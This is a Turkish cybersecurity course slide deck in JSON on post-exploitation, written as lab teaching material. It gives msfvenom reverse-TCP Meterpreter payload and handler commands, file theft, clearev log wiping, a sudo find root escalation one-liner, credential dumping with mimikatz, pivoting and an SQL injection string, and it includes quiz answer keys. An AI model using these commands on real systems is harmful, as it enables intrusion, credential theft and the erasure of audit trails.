@@ -1,0 +1,290 @@
+[
+  {
+    "baslik": "Siber Güvenlik: Hafta 10",
+    "altbaslik": "İleri Sızma Testi ve Sömürü Sonrası (Post-Exploitation)",
+    "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: İleri Düzey Sömürü ve Sistem Hakimiyeti\nHaftalık Odak: msfvenom ile Payload Üretimi, Multi-Handler, Meterpreter ve İz Silme\nHedef: Ters bağlantı ajanları üretmek, oturum yönetmek ve sömürü sonrası adımları icra etmek.",
+    "gorsel": {
+      "type": "image",
+      "query": "post exploitation meterpreter privilege escalation reverse shell"
+    }
+  },
+  {
+    "baslik": "Neden Bu Konuyu Öğreniyoruz?",
+    "altbaslik": "Sektörel Bağlam: İçeri Girdikten Sonra Ne Olur?",
+    "icerik": "Sisteme sızmak sadece kapıyı aralamaktır; asıl risk sömürü sonrası aşamada başlar.\n- Saldırgan sistemde kalıcılık (Persistence) sağlar ve yetkilerini yükseltir.\n- Ağdaki diğer sunuculara sıçrar (Pivoting) ve izlerini siler.\nSavunma tarafı bu hareketleri tespit edip durdurmayı bilmelidir.",
+    "gorsel": {
+      "type": "image",
+      "query": "threat hunting soc analyst detecting lateral movement"
+    }
+  },
+  {
+    "baslik": "Haftanın Öğrenme Kazanımları",
+    "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?",
+    "icerik": "1. Sömürü Sonrası (Post-Exploitation) aşamalarını açıklar.\n2. Meterpreter payload'unun bellek içi (In-Memory) çalışma mimarisini kavrar.\n3. msfvenom aracıyla özel Linux/ELF ve Windows payloadları üretir.\n4. Metasploit Multi-Handler dinleyicisi ile ters bağlantıları (Reverse TCP) yakalar.\n5. Meterpreter komutları ile bilgi toplama, dosya çekme ve iz silme (clearev) uygular.",
+    "gorsel": {
+      "type": "image",
+      "query": "learning objectives post exploitation checklist"
+    }
+  },
+  {
+    "baslik": "Sömürü Sonrası (Post-Exploitation) Adımları",
+    "altbaslik": "Sistem Hakimiyeti Yol Haritası",
+    "icerik": "[İlk Erişim (Foothold)]\n       |\n       v\n[Sistem Keşfi (Discovery)] -> İşletim sistemi, kullanıcılar, ağ bağlantıları\n       |\n       v\n[Yetki Yükseltme (Privilege Escalation)] -> Düşük kullanıcıdan root/SYSTEM'e geçiş\n       |\n       v\n[Kalıcılık (Persistence)] -> Arka kapı yerleştirme\n       |\n       v\n[Yatay İlerleme (Pivoting)] -> Diğer iç sunuculara sıçrama\n       |\n       v\n[İz Silme (Covering Tracks)] -> Log temizleme",
+    "gorsel": {
+      "type": "image",
+      "query": "post exploitation workflow diagram privilege escalation"
+    }
+  },
+  {
+    "baslik": "Meterpreter Nedir ve Neden Çok Güçlüdür?",
+    "altbaslik": "Gelişmiş Saldırı Ajanı",
+    "icerik": "Meterpreter, Metasploit'in en yetenekli saldırı yüküdür.\nÜstün Özellikleri:\n- Bellek İçi (In-Memory) Çalışır: Sabit diske dosya yazmaz, doğrudan RAM'de meşru süreçlerin (explorer.exe vb.) içine enjekte olur.\n- Antivirüsleri Zorlar: Diskte imza bırakmadığı için geleneksel antivirüsleri atlatır.\n- Şifreli İletişim: Saldırgan ile kurban arasındaki tüm komutlar TLS ile şifrelenir.",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter in memory execution ram stealth injection"
+    }
+  },
+  {
+    "baslik": "Ters Bağlantı (Reverse Shell) vs Düz Bağlantı (Bind Shell)",
+    "altbaslik": "Neden Reverse TCP?",
+    "icerik": "- Bind Shell: Kurban bilgisayarda bir port açılır ve saldırgan bağlanır. Ancak kurbanın önündeki Güvenlik Duvarı dışarıdan gelen bu bağlantıyı ENGELLER!\n- Reverse TCP Shell: Kurban bilgisayar dışarıdaki saldırgan IP'sine doğru bağlantı açar. Güvenlik duvarları dışarıya giden bağlantılara genellikle izin verdiği için engeli aşar!",
+    "gorsel": {
+      "type": "image",
+      "query": "bind shell vs reverse shell firewall egress diagram"
+    }
+  },
+  {
+    "baslik": "msfvenom: Özel Payload Üretim Fabrikası",
+    "altbaslik": "Her Platforma Uygun Ajan",
+    "icerik": "msfvenom, bağımsız çalışabilen çalıştırılabilir (.exe, .elf, .apk, .war, .php) payload üreten araçtır.\nSözdizimi:\nmsfvenom -p <payload_adı> LHOST=<Kali_IP> LPORT=<Port> -f <format> -o <dosya_adı>\nÖrnek:\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=5555 -f elf -o ajan.elf",
+    "gorsel": {
+      "type": "image",
+      "query": "msfvenom payload generator terminal screen command line"
+    }
+  },
+  {
+    "baslik": "Metasploit Multi-Handler Dinleyicisi",
+    "altbaslik": "Gelen Bağlantıları Karşılamak",
+    "icerik": "Kurban makinede çalışan ajan Kali'mize doğru ters bağlantı kurduğunda, bu bağlantıyı kabul edecek bir dinleyici gereklidir.\nModül: exploit/multi/handler\nAyarlar:\n- set payload linux/x86/meterpreter/reverse_tcp\n- set LHOST <Kali_IP>\n- set LPORT 5555\n- exploit (Dinlemeye başlar)",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit multi handler listening reverse connection"
+    }
+  },
+  {
+    "baslik": "Temel Meterpreter Komutları",
+    "altbaslik": "Hedefte Hüküm Sürmek",
+    "icerik": "- sysinfo : Hedef sistemin işletim sistemi ve mimarisini gösterir.\n- getuid : Hangi kullanıcı yetkisinde olduğunuzu gösterir.\n- ps : Çalışan tüm süreçleri listeler.\n- download /etc/passwd . : Hedef bilgisayardan dosya çeker.\n- upload malware.exe : Hedefe dosya yükler.\n- shell : Standart işletim sistemi kabuğuna düşer.\n- clearev : Windows/Linux olay günlüklerini (Event Logs) temizler.",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter commands cheat sheet terminal options"
+    }
+  },
+  {
+    "baslik": "Yetki Yükseltme (Privilege Escalation) Mantığı",
+    "altbaslik": "Kullanıcıdan Yöneticiliğe Geçiş",
+    "icerik": "Sisteme sızıldığında genellikle düşük yetkili bir hesap (örn: www-data) elde edilir.\nYetki Yükseltme Yolları:\n- Çekirdek Açıkları (Kernel Exploits - Dirty COW vb.)\n- Yanlış Yapılandırılmış SUID Dosyaları\n- Parolası unutulmuş Sudo Hakları (sudo -l)\n- Zafiyetli Servis İzinleri.",
+    "gorsel": {
+      "type": "image",
+      "query": "privilege escalation ladder user to root admin icon"
+    }
+  },
+  {
+    "baslik": "Uygulama Laboratuvarı: Payload ve Meterpreter",
+    "altbaslik": "Laboratuvar Hedeflerimiz",
+    "icerik": "Laboratuvarımızda:\n1. msfvenom ile Linux için Meterpreter ajanı üreteceğiz.\n2. Metasploit Multi-Handler dinleyicisini kuracağız.\n3. Ajanı koşturup canlı Meterpreter oturumu yakalayacağız.\n4. sysinfo, getuid ve dosya çekme komutlarını uygulayacağız.",
+    "gorsel": {
+      "type": "image",
+      "query": "students cybersecurity lab terminal meterpreter practice"
+    }
+  },
+  {
+    "baslik": "Uygulama 1: msfvenom ile Ajan Üretme",
+    "altbaslik": "ELF Payload Derleme",
+    "icerik": "Masaüstünde postlab klasörü açalım:\nmkdir -p ~/Desktop/postlab && cd ~/Desktop/postlab\nKali IP adresinizi kontrol edin (ip a) ve komutu yazın:\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=5555 -f elf -o lab_ajani.elf\nBeklenen Çıktı: Saved as: lab_ajani.elf",
+    "gorsel": {
+      "type": "image",
+      "query": "msfvenom generation terminal output elf payload"
+    }
+  },
+  {
+    "baslik": "Uygulama 2: Multi-Handler Başlatma",
+    "altbaslik": "Dinleyiciyi Hazırlama",
+    "icerik": "Yeni bir terminalde msfconsole'u açın:\nmsfconsole -q\nŞu komutları sırayla yazın:\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 192.168.1.105\nmsf6 exploit(multi/handler) > set LPORT 5555\nmsf6 exploit(multi/handler) > exploit\n[*] Started reverse TCP handler on 192.168.1.105:5555...",
+    "gorsel": {
+      "type": "image",
+      "query": "multi handler listening reverse tcp terminal"
+    }
+  },
+  {
+    "baslik": "Uygulama 3: Ajanı Koşturma ve Oturum Açma",
+    "altbaslik": "Ters Bağlantıyı Yakalamak",
+    "icerik": "İlk terminalde ajana çalıştırma izni verip arka planda çalıştırın:\nchmod +x ~/Desktop/postlab/lab_ajani.elf\n~/Desktop/postlab/lab_ajani.elf &\nMetasploit Ekranında Çıkan Müjde:\n[+] Meterpreter session 1 opened (192.168.1.105:5555 -> 192.168.1.105:xxxxx)\nmeterpreter >",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter session 1 opened prompt terminal"
+    }
+  },
+  {
+    "baslik": "Uygulama 4: Meterpreter Oturumunda Keşif",
+    "altbaslik": "Sistem Bilgilerini Toplama",
+    "icerik": "meterpreter > istemcisinde şu komutları deneyin:\nsysinfo\n(Sistem adı, işletim sistemi ve mimari gelir)\ngetuid\n(Geçerli kullanıcı kimliği ekrana basılır)\nps\n(Çalışan tüm süreçleri listeleyin)",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter sysinfo getuid output terminal"
+    }
+  },
+  {
+    "baslik": "Uygulama 5: Dosya İndirme ve İz Silme",
+    "altbaslik": "download ve clearev",
+    "icerik": "Hedef sistemden /etc/passwd dosyasını Kali'mize çekelim:\nmeterpreter > download /etc/passwd .\nOlay günlüklerini temizleyelim:\nmeterpreter > clearev\n[*] Wiping 3 records from Application...\n[*] Event logs cleared!",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter download file clearev event log wipe"
+    }
+  },
+  {
+    "baslik": "Sık Yapılan Hatalar ve İpuçları",
+    "altbaslik": "Post-Exploitation Sorunları",
+    "icerik": "1. LHOST Hatası: LHOST kısmına kurbanın değil, KENDİ Kali IP adresinizin yazıldığından emin olun.\n2. Port Çakışması: 'Handler failed to bind' hatası alırsanız port meşguldür, LPORT'u 6666 yapın.\n3. Oturum Askıda Kalırsa: sessions -l ile oturumları listeleyin, sessions -i 1 ile oturuma tekrar girin.",
+    "gorsel": {
+      "type": "image",
+      "query": "troubleshooting meterpreter sessions checklist warning"
+    }
+  },
+  {
+    "baslik": "Sektörel Vaka: SolarWinds Siber Casusluğu",
+    "altbaslik": "Tedarik Zinciri ve Gizli Kalma",
+    "icerik": "Vaka: Rus APT grubu SolarWinds şirketinin yazılım güncelleme sunucusuna sızarak resmi güncellemelerin içine gizli bir ajan (Sunburst) yerleştirdi.\nPost-Exploitation Analizi: Zararlı aylarca hiçbir şey yapmadan bekledi, antivirüsleri devre dışı bıraktı ve sadece RAM'de çalışarak ABD devlet kurumlarının verilerini sızdırdı.\nDers: Bellek içi çalışan gelişmiş ajanlar disk antivirüslerini tamamen atlatabilir.",
+    "gorsel": {
+      "type": "image",
+      "query": "solarwinds cyber espionage supply chain hack breach"
+    }
+  },
+  {
+    "baslik": "Vaka Analizi: Tehdit Avcılığı (Threat Hunting)",
+    "altbaslik": "Çıkarılan Mühendislik Dersi",
+    "icerik": "Savunma Çözümü: EDR (Endpoint Detection and Response) ve Tehdit Avcılığı.\n- Yalnızca diski taramak yetmez; bellek (RAM) süreç enjeksiyonları, şüpheli ağ bağlantıları ve giden ters bağlantılar (Egress) sürekli denetlenmelidir.",
+    "gorsel": {
+      "type": "image",
+      "query": "threat hunting edr endpoint security ram analysis"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 1",
+    "altbaslik": "Payload Türleri",
+    "icerik": "Soru: Kurban bilgisayarın doğrudan saldırganın IP ve portuna doğru bağlantı açtığı kabuk türüne ne ad verilir?\nA) Bind Shell\nB) Reverse Shell (Ters Bağlantı)\nC) Web Shell\nD) Telnet Shell\n\nDoğru Cevap: B (Reverse Shell)",
+    "gorsel": {
+      "type": "image",
+      "query": "quiz question multiple choice exam board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 2",
+    "altbaslik": "Araç Tanıma",
+    "icerik": "Soru: Metasploit çerçevesinde bağımsız çalışabilen özel trojan ve payload dosyaları (.elf, .exe) üreten araç hangisidir?\nA) msfconsole\nB) msfvenom\nC) Nmap\nD) Wireshark\n\nDoğru Cevap: B (msfvenom)",
+    "gorsel": {
+      "type": "image",
+      "query": "msfvenom tool question test"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 3",
+    "altbaslik": "Meterpreter Mimarisi",
+    "icerik": "Soru: Meterpreter'ın geleneksel disk antivirüslerine yakalanmamasının en temel sebebi nedir?\nA) Şifresiz olması\nB) Diske yazmadan doğrudan RAM bellekte çalışması (In-Memory)\nC) Çok yavaş çalışması\nD) Linux desteklememesi\n\nDoğru Cevap: B (Doğrudan RAM bellekte çalışması)",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter memory architecture question"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 4",
+    "altbaslik": "Meterpreter Komutları",
+    "icerik": "Soru: Ele geçirilen hedef sistemdeki olay günlüklerini (Event Logs) temizleyerek izleri silen Meterpreter komutu hangisidir?\nA) delete_all\nB) clearev\nC) clear_history\nD) wipe_disk\n\nDoğru Cevap: B (clearev)",
+    "gorsel": {
+      "type": "image",
+      "query": "clearev command question test"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 5",
+    "altbaslik": "Sömürü Sonrası",
+    "icerik": "Soru: Ele geçirilen düşük yetkili bir kullanıcı hesabından root veya Administrator yetkisine geçiş işlemine ne ad verilir?\nA) Pivoting\nB) Privilege Escalation (Yetki Yükseltme)\nC) Phishing\nD) Fuzzing\n\nDoğru Cevap: B (Yetki Yükseltme)",
+    "gorsel": {
+      "type": "image",
+      "query": "privilege escalation question board"
+    }
+  },
+  {
+    "baslik": "Sınıf İçi Tartışma ve Uygulama",
+    "altbaslik": "Meterpreter ile Süreç Taşıma",
+    "icerik": "Uygulama Görevi:\nMeterpreter oturumunda migrate komutunu kullanarak ajanınızı başka bir süreç numarasına (PID) taşımayı deneyin.\n- ps komutu ile hedef PID'yi bulun.\n- migrate <PID> komutunu başarıyla çalıştıran ilk öğrenci el kaldırsın!",
+    "gorsel": {
+      "type": "image",
+      "query": "students competition classroom coding linux challenge"
+    }
+  },
+  {
+    "baslik": "Yetki Yükseltme: Sudo Haklarını Sömürme",
+    "altbaslik": "sudo -l Kontrolü",
+    "icerik": "Ele geçirilen kullanıcıda ilk bakılan komut: sudo -l\nBu komut kullanıcının şifresiz çalıştırabildiği ayrıcalıklı programları gösterir.\nÖrnek:\nKullanıcı 'sudo find' çalıştırabiliyorsa:\nsudo find . -exec /bin/sh \\; -quit\nkomutuyla tek saniyede ROOT yetkisine yükselir! (GTFOBins tekniği).",
+    "gorsel": {
+      "type": "image",
+      "query": "gtfobins sudo privilege escalation terminal root"
+    }
+  },
+  {
+    "baslik": "SAM ve Shadow Dosyalarından Hash Çalma",
+    "altbaslik": "Credential Dumping Mantığı",
+    "icerik": "Yetkili erişim kazanıldıktan sonra amaç diğer kullanıcıların parolalarını almaktır.\n- Windows: mimikatz veya Meterpreter hashdump ile RAM'deki NTLM hashleri çekilir.\n- Linux: /etc/shadow dosyasındaki SHA-512 hashleri okunup John the Ripper'a aktarılır.",
+    "gorsel": {
+      "type": "image",
+      "query": "credential dumping sam shadow password hashes"
+    }
+  },
+  {
+    "baslik": "Ağda Yatay İlerleme (Lateral Movement & Pivoting)",
+    "altbaslik": "İç Ağdaki Diğer Sunuculara Atlama",
+    "icerik": "Pivoting:\nEle geçirilen ilk sunucu (DMZ Web Sunucusu) bir sıçrama tahtası (Proxy/Router) olarak kullanılır.\n- Metasploit autoroute ve socks_proxy modülü ile saldırgan kendi Kali'sini sanki iç ağdaymış gibi yönlendirir ve internete kapalı olan iç veritabanı sunucularını taramaya başlar!",
+    "gorsel": {
+      "type": "image",
+      "query": "pivoting lateral movement network jump diagram"
+    }
+  },
+  {
+    "baslik": "Çözümlü Uygulama: Meterpreter Oturum Yönetimi",
+    "altbaslik": "sessions Komutları",
+    "icerik": "Birden fazla kurban makine ele geçirildiğinde oturumlar şöyle yönetilir:\n- Arka Plana Atma: CTRL + Z veya background\n- Oturumları Listeleme: sessions -l\n- 2 Numaralı Oturuma Geçiş: sessions -i 2\n- Oturumu Kapatma: sessions -k 1",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit sessions management terminal screen"
+    }
+  },
+  {
+    "baslik": "Haftalık Konu Özeti",
+    "altbaslik": "Bu Hafta Neler Öğrendik?",
+    "icerik": "- Sömürü sonrası aşama sistem hakimiyeti ve yetki yükseltme sürecidir.\n- Reverse TCP bağlantıları güvenlik duvarlarını aşmak için standart tercihtir.\n- msfvenom her türlü platforma uygun ajan üretir, Multi-Handler bu bağlantıyı karşılar.\n- Meterpreter bellek içi çalışarak tam sistem kontrolü ve iz silme imkanı sağlar.",
+    "gorsel": {
+      "type": "image",
+      "query": "summary concept mind map review"
+    }
+  },
+  {
+    "baslik": "Gelecek Haftaya Bakış",
+    "altbaslik": "Hafta 11: Web Uygulama Güvenliği ve SQL Injection",
+    "icerik": "Ön Hazırlık:\n- Web uygulamaları ve OWASP Top 10 sıralaması nedir?\n- SQL Injection açığı nasıl ortaya çıkar ve ' OR '1'='1 nasıl çalışır?\n- SQLMap aracıyla tüm veritabanı tabloları nasıl sızdırılır?",
+    "gorsel": {
+      "type": "image",
+      "query": "sql injection web application security database concept"
+    }
+  },
+  {
+    "baslik": "Çıkış Bileti (Exit Ticket)",
+    "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız",
+    "icerik": "Günün Sorusu:\n'Neden sızma testlerinde hedef makinede bir port açıp bağlanmak (Bind Shell) yerine hedef makinenin bizim Kali IP'mize bağlanması (Reverse Shell) tercih edilir?'\n\nCevabınızı kâğıda yazıp teslim ediniz.",
+    "gorsel": {
+      "type": "image",
+      "query": "exit ticket paper feedback classroom student"
+    }
+  }
+]
